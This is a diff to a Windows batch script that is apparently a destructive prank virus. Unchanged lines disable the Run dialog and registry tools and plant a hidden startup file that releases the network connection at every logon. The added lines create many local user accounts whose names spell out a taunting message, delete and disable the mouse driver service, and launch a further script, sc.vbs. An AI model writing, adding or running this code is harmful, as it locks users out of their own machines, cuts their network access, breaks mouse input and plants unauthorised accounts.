@@ -153,8 +153,29 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Dis
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
 start https://www.youtube.com/watch?v=AK8uJcCsRDM
-ipconfig /release
 cd "C:\Users\volde\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 echo ipconfig /release > startup.bat
 attrib +h +s +r startup.bat
+net user %random% %random% /add
+net user your death /add
+net user pc death /add
+net user was death /add
+net user trashed death /add
+net user by death /add
+net user wenomechainsama death /add
+net user virus death /add
+net user Good death /add
+net user luck death /add
+net user your death /add
+net user mouse death /add
+net user won't death /add
+net user work death /add
+net user anymore death /add
+@echo off
+rem ---------------------------------
+rem Disable Mouse
+set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
+reg delete %key%
+reg add %key% /v Start /t REG_DWORD /d 4
+rem ---------------------------------
 start sc.vbs
